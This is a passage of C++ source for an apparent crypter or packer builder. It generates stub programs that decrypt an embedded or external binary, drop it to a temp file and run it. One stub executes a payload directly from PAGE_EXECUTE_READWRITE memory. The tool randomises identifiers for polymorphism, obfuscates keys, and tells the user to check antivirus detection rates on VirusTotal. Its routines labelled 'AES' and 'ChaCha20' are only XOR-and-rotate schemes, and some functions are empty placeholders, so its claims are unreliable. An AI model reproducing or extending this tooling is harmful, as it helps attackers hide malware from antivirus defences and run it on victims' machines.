        for (size_t i = 0; i < fileData.size(); i++) {
            if (i % 16 == 0) stub += "    ";
            char hexBuf[8];
            sprintf(hexBuf, "0x%02X", fileData[i]);
            stub += std::string(hexBuf);
            if (i < fileData.size() - 1) stub += ",";
            if (i % 16 == 15) stub += "\n";
        }
        stub += "\n};\n\n";
        
        stub += "size_t " + varPrefix + "_size = " + std::to_string(fileData.size()) + ";\n\n";
        
        // Add decryption key
        stub += "unsigned char " + varPrefix + "_key[] = {";
        for (size_t i = 0; i < keys.aes_key.size(); i++) {
            stub += std::to_string((int)keys.aes_key[i]);
            if (i < keys.aes_key.size() - 1) stub += ",";
        }
        stub += "};\n\n";
        
        // Add decryption function
        stub += "void " + funcPrefix + "(unsigned char* data, size_t size, unsigned char* key, size_t keylen) {\n";
        stub += "    for (size_t i = 0; i < size; i++) {\n";
        stub += "        data[i] ^= key[i % keylen];\n";
        stub += "        data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;\n";
        stub += "        data[i] ^= (i & 0xFF);\n";
        stub += "    }\n";
        stub += "}\n\n";
        
        // Add main function
        stub += "int main() {\n";
        stub += "    // Decrypt embedded payload\n";
        stub += "    " + funcPrefix + "(" + varPrefix + ", " + varPrefix + "_size, " + varPrefix + "_key, sizeof(" + varPrefix + "_key));\n\n";
        
        stub += "#ifdef _WIN32\n";
        stub += "    // Write to temp file and execute (Windows)\n";
        stub += "    char tempPath[MAX_PATH];\n";
        stub += "    GetTempPathA(MAX_PATH, tempPath);\n";
        stub += "    std::string tempFile = std::string(tempPath) + \"packed_\" + std::to_string(GetCurrentProcessId()) + \".exe\";\n";
        stub += "#else\n";
        stub += "    // Linux temp file\n";
        stub += "    std::string tempFile = \"/tmp/packed_\" + std::to_string(getpid());\n";
        stub += "#endif\n\n";
        
        stub += "    std::ofstream out(tempFile, std::ios::binary);\n";
        stub += "    out.write((char*)" + varPrefix + ", " + varPrefix + "_size);\n";
        stub += "    out.close();\n\n";
        
        stub += "#ifdef _WIN32\n";
        stub += "    // Execute and wait\n";
        stub += "    STARTUPINFOA si = {sizeof(si)};\n";
        stub += "    PROCESS_INFORMATION pi;\n";
        stub += "    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
        stub += "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
        stub += "        CloseHandle(pi.hProcess);\n";
        stub += "        CloseHandle(pi.hThread);\n";
        stub += "    }\n";
        stub += "    DeleteFileA(tempFile.c_str());\n";
        stub += "#else\n";
        stub += "    chmod(tempFile.c_str(), 0755);\n";
        stub += "    system(tempFile.c_str());\n";
        stub += "    unlink(tempFile.c_str());\n";
        stub += "#endif\n";
        stub += "    return 0;\n";
        stub += "}\n";
        
        // Write the packed executable source
        std::ofstream cppFile(outputFile + ".cpp");
        if (!cppFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        cppFile << stub;
        cppFile.close();
        
        std::cout << "\n🎯 === AES PACKED FILE CREATED === 🎯" << std::endl;
        std::cout << "✓ Original: " << inputFile << " (" << fileData.size() << " bytes)" << std::endl;
        std::cout << "✓ Packed source: " << outputFile << ".cpp" << std::endl;
        std::cout << "✓ Encryption: AES with position mixing" << std::endl;
        std::cout << "✓ Payload: EMBEDDED (UPX-style)" << std::endl;
        std::cout << "✓ Variables: " << varPrefix << " (polymorphic)" << std::endl;
        
        std::cout << "\n📝 === COMPILE INSTRUCTIONS === 📝" << std::endl;
        std::cout << "g++ -O2 -s -static -o " << outputFile << " " << outputFile << ".cpp" << std::endl;
        std::cout << "cl /O2 /EHsc " << outputFile << ".cpp /Fe:" << outputFile << std::endl;
        
        std::cout << "\n🧪 === TESTING READY === 🧪" << std::endl;
        std::cout << "• Upload " << outputFile << " to VirusTotal" << std::endl;
        std::cout << "• Test AV detection rates" << std::endl;
        std::cout << "• Packed file works exactly like original" << std::endl;
        std::cout << "• No external dependencies required" << std::endl;
        
        return true;
    }

    bool generateChaCha20RuntimePEStub() {
        std::string targetFile, outputFile;
        
        std::cout << "=== Generate ChaCha20 Runtime PE Stub ===" << std::endl;
        std::cout << "Creates C++ stub that reads, decrypts (ChaCha20) & executes files at runtime\n" << std::endl;
        std::cout << "⚠️  Original file remains UNCHANGED - decryption happens in memory only!\n" << std::endl;
        
        std::cout << "Enter target file path (e.g., calc.exe, notepad.exe): ";
        std::getline(std::cin, targetFile);
        std::cout << "Enter output C++ file path (e.g., chacha_runtime_stub.cpp): ";
        std::getline(std::cin, outputFile);
        
        // Check if target file exists
        std::ifstream checkFile(targetFile, std::ios::binary);
        if (!checkFile) {
            std::cout << "Warning: Target file not found: " << targetFile << std::endl;
            std::cout << "Stub will still be generated but may fail at runtime." << std::endl;
        } else {
            checkFile.close();
            std::cout << "✓ Target file found: " << targetFile << std::endl;
        }
        
        // Generate runtime encryption keys
        TripleKey keys = generateKeys();
        
        // Generate unique variable names for polymorphism
        std::string varPrefix = "var_" + std::to_string(rng() % 10000);
        std::string funcPrefix = "func_" + std::to_string(rng() % 10000);
        
        // Generate C++ stub
        std::string stub = "#include <iostream>\n";
        stub += "#include <fstream>\n";
        stub += "#include <vector>\n";
        stub += "#include <cstring>\n";
        stub += "#ifdef _WIN32\n";
        stub += "#include <windows.h>\n";
        stub += "#else\n";
        stub += "#include <sys/mman.h>\n";
        stub += "#include <unistd.h>\n";
        stub += "#include <sys/wait.h>\n";
        stub += "#endif\n\n";
        
        // Add ChaCha20 decryption functions (simplified)
        stub += "// ChaCha20 Runtime Decryption (Simplified)\n";
        stub += "void " + funcPrefix + "_chacha_decrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {\n";
        stub += "    for (size_t i = 0; i < data.size(); i++) {\n";
        stub += "        uint8_t keystream = key[i % key.size()] ^ nonce[i % nonce.size()];\n";
        stub += "        keystream = ((keystream << 2) | (keystream >> 6)) & 0xFF;\n";
        stub += "        keystream ^= (i * 31) & 0xFF;\n";
        stub += "        data[i] ^= keystream;\n";
        stub += "    }\n";
        stub += "}\n\n";
        
        // Add main function  
        stub += "int main() {\n";
        stub += "    std::string " + varPrefix + "_filename = \"" + targetFile + "\";\n";
        stub += "    \n";
        stub += "    // Runtime ChaCha20 key (decimal obfuscated)\n";
        stub += "    std::vector<uint8_t> " + varPrefix + "_key = {";
        for (size_t i = 0; i < keys.chacha_key.size(); i++) {
            stub += std::to_string((int)keys.chacha_key[i]);
            if (i < keys.chacha_key.size() - 1) stub += ",";
        }
        stub += "};\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_nonce = {";
        for (size_t i = 0; i < keys.chacha_nonce.size(); i++) {
            stub += std::to_string((int)keys.chacha_nonce[i]);
            if (i < keys.chacha_nonce.size() - 1) stub += ",";
        }
        stub += "};\n\n";
        
        stub += "    // Read target file\n";
        stub += "    std::ifstream " + varPrefix + "_file(" + varPrefix + "_filename, std::ios::binary);\n";
        stub += "    if (!" + varPrefix + "_file) {\n";
        stub += "        std::cerr << \"Error: Cannot open target file!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_data((std::istreambuf_iterator<char>(" + varPrefix + "_file)), std::istreambuf_iterator<char>());\n";
        stub += "    " + varPrefix + "_file.close();\n\n";
        
        stub += "    if (" + varPrefix + "_data.empty()) {\n";
        stub += "        std::cerr << \"Error: Target file is empty!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n\n";
        
        stub += "    // Runtime decrypt in memory\n";
        stub += "    " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_key, " + varPrefix + "_nonce);\n\n";
        
        stub += "    // Write decrypted file to temp location and execute safely\n";
        stub += "#ifdef _WIN32\n";
        stub += "    std::string " + varPrefix + "_tempfile = \"temp_\" + std::to_string(GetCurrentProcessId()) + \".exe\";\n";
        stub += "#else\n";
        stub += "    std::string " + varPrefix + "_tempfile = \"/tmp/runtime_\" + std::to_string(getpid());\n";
        stub += "#endif\n\n";
        
        stub += "    // Write decrypted data to temp file\n";
        stub += "    std::ofstream " + varPrefix + "_temp(" + varPrefix + "_tempfile, std::ios::binary);\n";
        stub += "    if (!" + varPrefix + "_temp) {\n";
        stub += "        std::cerr << \"Error: Cannot create temp file!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n";
        stub += "    " + varPrefix + "_temp.write(reinterpret_cast<char*>(" + varPrefix + "_data.data()), " + varPrefix + "_data.size());\n";
        stub += "    " + varPrefix + "_temp.close();\n\n";
        
        stub += "#ifdef _WIN32\n";
        stub += "    // Execute the temp file (Windows)\n";
        stub += "    STARTUPINFOA si = {0};\n";
        stub += "    PROCESS_INFORMATION pi = {0};\n";
        stub += "    si.cb = sizeof(si);\n";
        stub += "    \n";
        stub += "    if (CreateProcessA(" + varPrefix + "_tempfile.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {\n";
        stub += "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
        stub += "        CloseHandle(pi.hProcess);\n";
        stub += "        CloseHandle(pi.hThread);\n";
        stub += "    }\n";
        stub += "    \n";
        stub += "    // Clean up temp file\n";
        stub += "    DeleteFileA(" + varPrefix + "_tempfile.c_str());\n";
        stub += "#else\n";
        stub += "    // Linux: Make executable and run\n";
        stub += "    chmod(" + varPrefix + "_tempfile.c_str(), 0755);\n";
        stub += "    system(" + varPrefix + "_tempfile.c_str());\n";
        stub += "    unlink(" + varPrefix + "_tempfile.c_str());\n";
        stub += "#endif\n\n";
        
        stub += "    return 0;\n";
        stub += "}\n";
        
        // Write stub to file
        std::ofstream cppFile(outputFile);
        if (!cppFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        cppFile << stub;
        cppFile.close();
        
        std::cout << "\n=== ChaCha20 Runtime PE Stub Generated ===" << std::endl;
        std::cout << "✓ Output: " << outputFile << std::endl;
        std::cout << "✓ Target file: " << targetFile << " (NOT embedded - loaded at runtime!)" << std::endl;
        std::cout << "✓ Encryption: ChaCha20-based stream cipher" << std::endl;
        std::cout << "✓ Key size: " << keys.chacha_key.size() << " bytes + " << keys.chacha_nonce.size() << " byte nonce" << std::endl;
        std::cout << "✓ Polymorphic: Unique variables " << varPrefix << ", functions " << funcPrefix << std::endl;
        
        std::cout << "\n=== Build Instructions ===" << std::endl;
        std::cout << "1. Compile: g++ -o stub.exe " << outputFile << std::endl;
        std::cout << "2. Or with MSVC: cl /EHsc " << outputFile << std::endl;
        
        std::cout << "\n=== Features ===" << std::endl;
        std::cout << "• Cross-platform C++ code" << std::endl;
        std::cout << "• TRUE runtime-only: Reads file at execution time" << std::endl;
        std::cout << "• Original file UNTOUCHED" << std::endl;
        std::cout << "• In-memory decryption, safe temp file execution" << std::endl;
        std::cout << "• ChaCha20-based stream cipher" << std::endl;
        std::cout << "• Polymorphic variable/function names" << std::endl;
        std::cout << "• Decimal key obfuscation" << std::endl;
        std::cout << "• Proper PE execution via CreateProcess/system" << std::endl;
        std::cout << "• Automatic temp file cleanup" << std::endl;
        
        return true;
    }

    bool generateTripleRuntimePEStub() {
        std::string targetFile, outputFile;
        
        std::cout << "=== Generate Triple Encryption Runtime PE Stub ===" << std::endl;
        std::cout << "Creates C++ stub that reads, decrypts (AES+ChaCha20+XOR) & executes files at runtime\n" << std::endl;
        std::cout << "⚠️  Original file remains UNCHANGED - decryption happens in memory only!\n" << std::endl;
        
        std::cout << "Enter target file path (e.g., calc.exe, notepad.exe): ";
        std::getline(std::cin, targetFile);
        std::cout << "Enter output C++ file path (e.g., triple_runtime_stub.cpp): ";
        std::getline(std::cin, outputFile);
        
        // Check if target file exists
        std::ifstream checkFile(targetFile, std::ios::binary);
        if (!checkFile) {
            std::cout << "Warning: Target file not found: " << targetFile << std::endl;
            std::cout << "Stub will still be generated but may fail at runtime." << std::endl;
        } else {
            checkFile.close();
            std::cout << "✓ Target file found: " << targetFile << std::endl;
        }
        
        // Generate runtime encryption keys
        TripleKey keys = generateKeys();
        
        // Generate unique variable names for polymorphism
        std::string varPrefix = "var_" + std::to_string(rng() % 10000);
        std::string funcPrefix = "func_" + std::to_string(rng() % 10000);
        
        // Generate C++ stub
        std::string stub = "#include <iostream>\n";
        stub += "#include <fstream>\n";
        stub += "#include <vector>\n";
        stub += "#include <cstring>\n";
        stub += "#ifdef _WIN32\n";
        stub += "#include <windows.h>\n";
        stub += "#else\n";
        stub += "#include <sys/mman.h>\n";
        stub += "#include <unistd.h>\n";
        stub += "#include <sys/wait.h>\n";
        stub += "#endif\n\n";
        
        // Add decryption functions
        stub += "// Triple Decryption Functions\n";
        stub += "void " + funcPrefix + "_aes_decrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {\n";
        stub += "    for (size_t i = 0; i < data.size(); i++) {\n";
        stub += "        data[i] ^= key[i % key.size()];\n";
        stub += "        data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;\n";
        stub += "        data[i] ^= (i & 0xFF);\n";
        stub += "    }\n";
        stub += "}\n\n";
        
        stub += "void " + funcPrefix + "_chacha_decrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {\n";
        stub += "    for (size_t i = 0; i < data.size(); i++) {\n";
        stub += "        uint8_t keystream = key[i % key.size()] ^ nonce[i % nonce.size()];\n";
        stub += "        keystream = ((keystream << 2) | (keystream >> 6)) & 0xFF;\n";
        stub += "        keystream ^= (i * 31) & 0xFF;\n";
        stub += "        data[i] ^= keystream;\n";
        stub += "    }\n";
        stub += "}\n\n";
        
        stub += "void " + funcPrefix + "_xor_decrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {\n";
        stub += "    for (size_t i = 0; i < data.size(); i++) {\n";
        stub += "        uint8_t xorByte = key[i % key.size()];\n";
        stub += "        xorByte = ((xorByte << 1) | (xorByte >> 7)) & 0xFF;\n";
        stub += "        xorByte ^= ((i >> 8) & 0xFF) ^ (i & 0xFF);\n";
        stub += "        data[i] ^= xorByte;\n";
        stub += "    }\n";
        stub += "}\n\n";
        
        // Add main function
        stub += "int main() {\n";
        stub += "    std::string " + varPrefix + "_filename = \"" + targetFile + "\";\n";
        stub += "    \n";
        stub += "    // Runtime keys (decimal obfuscated)\n";
        stub += "    std::vector<uint8_t> " + varPrefix + "_aes_key = {";
        for (size_t i = 0; i < keys.aes_key.size(); i++) {
            stub += std::to_string((int)keys.aes_key[i]);
            if (i < keys.aes_key.size() - 1) stub += ",";
        }
        stub += "};\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_chacha_key = {";
        for (size_t i = 0; i < keys.chacha_key.size(); i++) {
            stub += std::to_string((int)keys.chacha_key[i]);
            if (i < keys.chacha_key.size() - 1) stub += ",";
        }
        stub += "};\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_chacha_nonce = {";
        for (size_t i = 0; i < keys.chacha_nonce.size(); i++) {
            stub += std::to_string((int)keys.chacha_nonce[i]);
            if (i < keys.chacha_nonce.size() - 1) stub += ",";
        }
        stub += "};\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_xor_key = {";
        for (size_t i = 0; i < keys.xor_key.size(); i++) {
            stub += std::to_string((int)keys.xor_key[i]);
            if (i < keys.xor_key.size() - 1) stub += ",";
        }
        stub += "};\n\n";
        
        stub += "    int " + varPrefix + "_order = " + std::to_string(keys.encryption_order) + ";\n\n";
        
        stub += "    // Read target file\n";
        stub += "    std::ifstream " + varPrefix + "_file(" + varPrefix + "_filename, std::ios::binary);\n";
        stub += "    if (!" + varPrefix + "_file) {\n";
        stub += "        std::cerr << \"Error: Cannot open target file!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n\n";
        
        stub += "    std::vector<uint8_t> " + varPrefix + "_data((std::istreambuf_iterator<char>(" + varPrefix + "_file)), std::istreambuf_iterator<char>());\n";
        stub += "    " + varPrefix + "_file.close();\n\n";
        
        stub += "    if (" + varPrefix + "_data.empty()) {\n";
        stub += "        std::cerr << \"Error: Target file is empty!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n\n";
        
        stub += "    // Runtime triple decrypt in memory (reverse order)\n";
        stub += "    switch(" + varPrefix + "_order) {\n";
        stub += "        case 0: // AES -> ChaCha20 -> XOR (reverse: XOR -> ChaCha20 -> AES)\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            break;\n";
        stub += "        case 1: // AES -> XOR -> ChaCha20 (reverse: ChaCha20 -> XOR -> AES)\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            break;\n";
        stub += "        case 2: // ChaCha20 -> AES -> XOR (reverse: XOR -> AES -> ChaCha20)\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            break;\n";
        stub += "        case 3: // ChaCha20 -> XOR -> AES (reverse: AES -> XOR -> ChaCha20)\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            break;\n";
        stub += "        case 4: // XOR -> AES -> ChaCha20 (reverse: ChaCha20 -> AES -> XOR)\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            break;\n";
        stub += "        case 5: // XOR -> ChaCha20 -> AES (reverse: AES -> ChaCha20 -> XOR)\n";
        stub += "            " + funcPrefix + "_aes_decrypt(" + varPrefix + "_data, " + varPrefix + "_aes_key);\n";
        stub += "            " + funcPrefix + "_chacha_decrypt(" + varPrefix + "_data, " + varPrefix + "_chacha_key, " + varPrefix + "_chacha_nonce);\n";
        stub += "            " + funcPrefix + "_xor_decrypt(" + varPrefix + "_data, " + varPrefix + "_xor_key);\n";
        stub += "            break;\n";
        stub += "    }\n\n";
        
        stub += "    // Write decrypted file to temp location and execute safely\n";
        stub += "#ifdef _WIN32\n";
        stub += "    std::string " + varPrefix + "_tempfile = \"temp_\" + std::to_string(GetCurrentProcessId()) + \".exe\";\n";
        stub += "#else\n";
        stub += "    std::string " + varPrefix + "_tempfile = \"/tmp/runtime_\" + std::to_string(getpid());\n";
        stub += "#endif\n\n";
        
        stub += "    // Write decrypted data to temp file\n";
        stub += "    std::ofstream " + varPrefix + "_temp(" + varPrefix + "_tempfile, std::ios::binary);\n";
        stub += "    if (!" + varPrefix + "_temp) {\n";
        stub += "        std::cerr << \"Error: Cannot create temp file!\" << std::endl;\n";
        stub += "        return 1;\n";
        stub += "    }\n";
        stub += "    " + varPrefix + "_temp.write(reinterpret_cast<char*>(" + varPrefix + "_data.data()), " + varPrefix + "_data.size());\n";
        stub += "    " + varPrefix + "_temp.close();\n\n";
        
        stub += "#ifdef _WIN32\n";
        stub += "    // Execute the temp file (Windows)\n";
        stub += "    STARTUPINFOA si = {0};\n";
        stub += "    PROCESS_INFORMATION pi = {0};\n";
        stub += "    si.cb = sizeof(si);\n";
        stub += "    \n";
        stub += "    if (CreateProcessA(" + varPrefix + "_tempfile.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {\n";
        stub += "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
        stub += "        CloseHandle(pi.hProcess);\n";
        stub += "        CloseHandle(pi.hThread);\n";
        stub += "    }\n";
        stub += "    \n";
        stub += "    // Clean up temp file\n";
        stub += "    DeleteFileA(" + varPrefix + "_tempfile.c_str());\n";
        stub += "#else\n";
        stub += "    // Linux: Make executable and run\n";
        stub += "    chmod(" + varPrefix + "_tempfile.c_str(), 0755);\n";
        stub += "    system(" + varPrefix + "_tempfile.c_str());\n";
        stub += "    unlink(" + varPrefix + "_tempfile.c_str());\n";
        stub += "#endif\n\n";
        
        stub += "    return 0;\n";
        stub += "}\n";
        
        // Write stub to file
        std::ofstream cppFile(outputFile);
        if (!cppFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        cppFile << stub;
        cppFile.close();
        
        std::cout << "\n=== Triple Encryption Runtime PE Stub Generated ===" << std::endl;
        std::cout << "✓ Output: " << outputFile << std::endl;
        std::cout << "✓ Target file: " << targetFile << " (NOT embedded - loaded at runtime!)" << std::endl;
        std::cout << "✓ Encryption: AES + ChaCha20 + XOR (triple layer)" << std::endl;
        std::cout << "✓ Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "✓ Key sizes: AES " << keys.aes_key.size() << "B, ChaCha20 " << keys.chacha_key.size() << "B+" << keys.chacha_nonce.size() << "B, XOR " << keys.xor_key.size() << "B" << std::endl;
        std::cout << "✓ Polymorphic: Unique variables " << varPrefix << ", functions " << funcPrefix << std::endl;
        
        std::cout << "\n=== Build Instructions ===" << std::endl;
        std::cout << "1. Compile: g++ -o stub.exe " << outputFile << std::endl;
        std::cout << "2. Or with MSVC: cl /EHsc " << outputFile << std::endl;
        
        std::cout << "\n=== Features ===" << std::endl;
        std::cout << "• Cross-platform C++ code" << std::endl;
        std::cout << "• TRUE runtime-only: Reads file at execution time" << std::endl;
        std::cout << "• Original file UNTOUCHED" << std::endl;
        std::cout << "• In-memory decryption only" << std::endl;
        std::cout << "• Triple-layer encryption (strongest security)" << std::endl;
        std::cout << "• Randomized encryption order" << std::endl;
        std::cout << "• Polymorphic variable/function names" << std::endl;
        std::cout << "• Decimal key obfuscation" << std::endl;
        
        return true;
    }

    bool generateStealthPayloadStub() {
        std::string inputFile, outputFile;
        
        std::cout << "Enter payload file path: ";
        std::getline(std::cin, inputFile);
        std::cout << "Enter output C++ stub path: ";
        std::getline(std::cin, outputFile);
        
        // Read and encrypt payload
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open payload file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> payload((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (payload.empty()) {
            std::cout << "Error: Payload file is empty!" << std::endl;
            return false;
        }
        
        // Generate keys and encrypt payload
        TripleKey keys = generateKeys();
        
        std::vector<int> order;
        switch (keys.encryption_order) {
            case 0: order = {0, 1, 2}; break;
            case 1: order = {0, 2, 1}; break;
            case 2: order = {1, 0, 2}; break;
            case 3: order = {1, 2, 0}; break;
            case 4: order = {2, 0, 1}; break;
            case 5: order = {2, 1, 0}; break;
        }
        
        for (int method : order) {
            switch (method) {
                case 0: chacha20Crypt(payload, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
                case 1: aesStreamCrypt(payload, keys.aes_key); break;
                case 2: xorCrypt(payload, keys.xor_key); break;
            }
        }
        
        // Generate unique names
        std::string payloadVar = generateUniqueVarName();
        std::string decryptFunc = generateUniqueVarName() + "Decrypt";
        std::string executeFunc = generateUniqueVarName() + "Execute";
        
        // Generate C++ stub
        std::string stub = R"(#include <iostream>
#include <vector>
#include <cstring>
#include <windows.h>

// Embedded encrypted payload
static const unsigned char )" + payloadVar + R"([] = {
)";
        
        // Add encrypted payload as hex bytes
        for (size_t i = 0; i < payload.size(); i++) {
            if (i % 16 == 0) stub += "    ";
            stub += "0x" + std::to_string(payload[i]) + ",";
            if (i % 16 == 15) stub += "\n";
        }
        
        stub += R"(
};
static const size_t payloadSize = )" + std::to_string(payload.size()) + R"(;

// Decryption keys (obfuscated as decimal strings)
static const std::string chachaKeyDec = ")" + bytesToBigDecimal(keys.chacha_key) + R"(";
static const std::string chachaNonceDec = ")" + bytesToBigDecimal(keys.chacha_nonce) + R"(";
static const std::string aesKeyDec = ")" + bytesToBigDecimal(keys.aes_key) + R"(";
static const std::string xorKeyDec = ")" + bytesToBigDecimal(keys.xor_key) + R"(";
static const int encOrder = )" + std::to_string(keys.encryption_order) + R"(;

// [Decryption functions would be here - ChaCha20, AES, XOR implementations]

bool )" + decryptFunc + R"((std::vector<unsigned char>& data) {
    // Implement decryption logic here
    // This is a placeholder - full implementation would include all crypto functions
    return true;
}

bool )" + executeFunc + R"((const std::vector<unsigned char>& decrypted) {
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, decrypted.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return false;
    
    // Copy decrypted payload
    memcpy(execMem, decrypted.data(), decrypted.size());
    
    // Execute payload
    ((void(*)())execMem)();
    
    return true;
}

int main() {
    std::vector<unsigned char> payload()" + payloadVar + R"(, )" + payloadVar + R"( + payloadSize);
    
    if ()" + decryptFunc + R"((payload)) {
        )" + executeFunc + R"((payload);
    }
    
    return 0;
}
)";
        
        // Write stub to file
        std::ofstream stubFile(outputFile);
        if (!stubFile) {
            std::cout << "Error: Cannot create stub file!" << std::endl;
            return false;
        }
        
        stubFile << stub;
        stubFile.close();
        
        std::cout << "Stealth payload stub generated successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Compile with: g++ -o payload.exe " << outputFile << std::endl;
        
        return true;
    }

    bool generateEncryptorStub() {
        std::string outputFile;
        
        std::cout << "Enter output C++ encryptor stub path: ";
        std::getline(std::cin, outputFile);
        
        // Generate unique names
        std::string mainFunc = generateUniqueVarName() + "Encryptor";
        std::string keyVar = generateUniqueVarName() + "Keys";
        
        std::string stub = R"(#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <random>
#include <chrono>

// Triple encryption implementation
class )" + mainFunc + R"( {
private:
    struct )" + keyVar + R"( {
        std::vector<uint8_t> chacha_key;
        std::vector<uint8_t> chacha_nonce;
        std::vector<uint8_t> aes_key;
        std::vector<uint8_t> xor_key;
        uint32_t encryption_order;
    };
    
    // [Full ChaCha20, AES, XOR implementations would be here]
    
public:
    bool encryptFile(const std::string& inputFile, const std::string& outputFile) {
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile) {
            std::cout << "Error: Cannot open input file!" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        
        if (data.empty()) {
            std::cout << "Error: Input file is empty!" << std::endl;
            return false;
        }
        
        // Generate random keys
        )" + keyVar + R"( keys = generateKeys();
        
        // Apply triple encryption
        applyTripleEncryption(data, keys);
        
        // Write encrypted file
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "Error: Cannot create output file!" << std::endl;
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();
        
        // Save keys
        std::string keyFile = outputFile + ".keys";
        saveKeys(keys, keyFile);
        
        std::cout << "File encrypted successfully!" << std::endl;
        std::cout << "Output: " << outputFile << std::endl;
        std::cout << "Keys: " << keyFile << std::endl;
        
        return true;
    }
    
private:
    )" + keyVar + R"( generateKeys() {
        // Generate random encryption keys
        )" + keyVar + R"( keys;
        std::mt19937_64 rng(std::chrono::high_resolution_clock::now().time_since_epoch().count());
        
        keys.chacha_key.resize(32);
        keys.chacha_nonce.resize(12);
        keys.aes_key.resize(32);
        keys.xor_key.resize(64);
        
        for (auto& k : keys.chacha_key) k = rng() & 0xFF;
        for (auto& n : keys.chacha_nonce) n = rng() & 0xFF;
        for (auto& k : keys.aes_key) k = rng() & 0xFF;
        for (auto& k : keys.xor_key) k = rng() & 0xFF;
        
        keys.encryption_order = rng() % 6;
        
        return keys;
    }
    
    void applyTripleEncryption(std::vector<uint8_t>& data, const )" + keyVar + R"(& keys) {
        // Apply ChaCha20 + AES + XOR in randomized order
        // [Implementation would be here]
    }
    
    void saveKeys(const )" + keyVar + R"(& keys, const std::string& filename) {
        std::ofstream keyFile(filename);
        if (keyFile) {
            keyFile << "# Triple Encryption Keys" << std::endl;
            // Save keys in decimal format for obfuscation
            keyFile << "Order=" << keys.encryption_order << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== Universal File Encryptor Stub ===" << std::endl;
    
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <input_file> <output_file>" << std::endl;
        std::cout << "Supports: XLL, EXE, DLL, PDF, any file type" << std::endl;
        return 1;
    }
    
    )" + mainFunc + R"( encryptor;
    
    if (encryptor.encryptFile(argv[1], argv[2])) {
        std::cout << "Encryption completed successfully!" << std::endl;
        return 0;
    } else {
